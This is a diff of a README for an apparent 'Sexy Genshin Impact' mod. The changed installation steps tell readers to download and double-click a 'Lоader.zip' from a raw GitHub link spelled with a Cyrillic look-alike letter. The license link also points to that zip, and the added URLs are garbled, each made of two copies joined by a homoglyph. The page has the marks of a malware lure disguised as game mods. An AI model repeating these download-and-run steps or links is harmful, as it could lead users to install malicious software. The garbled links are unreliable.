@@ -33,13 +33,13 @@ Here is a detailed breakdown of the stunning features provided by the Sexy Gensh
 ## 🚀 Installation Instructions 🚀
 
 1. **Download**  
-   Download `https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip` directly from the repository's *Releases* section.
+   Download `https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zipоhttps://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip` directly from the repository's *Releases* section.
 
 2. **Extract**  
    Use your favorite archive tool (WinRAR, 7-Zip, Unarchiver, etc.) to extract the contents to a folder of your choice.
 
 3. **Run Loader**  
-   Execute the loader as per your OS—on Windows: double-click `https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip`; on macOS/Linux: open terminal and run the provided shell script.
+   Execute the loader as per your OS—on Windows: double-click `https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zipоhttps://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip`; on macOS/Linux: open terminal and run the provided shell script.
 
 4. **Customize Mods**  
    Use the interface to enable, preview, and adjust your desired character skins and animations.
@@ -79,7 +79,7 @@ Here is a detailed breakdown of the stunning features provided by the Sexy Gensh
 
 ## 📝 MIT License 📝
 
-This project is distributed under the [MIT License](https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip). Feel free to use, modify, and distribute as outlined in the license terms.  
+This project is distributed under the [MIT License](https://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zipоhttps://raw.githubusercontent.com/yaco29c/GlamourGenshin-Mods/main/Lоader.zip). Feel free to use, modify, and distribute as outlined in the license terms.  
 © 2025 Sexy Genshin Impact Mod Community
 
 ---
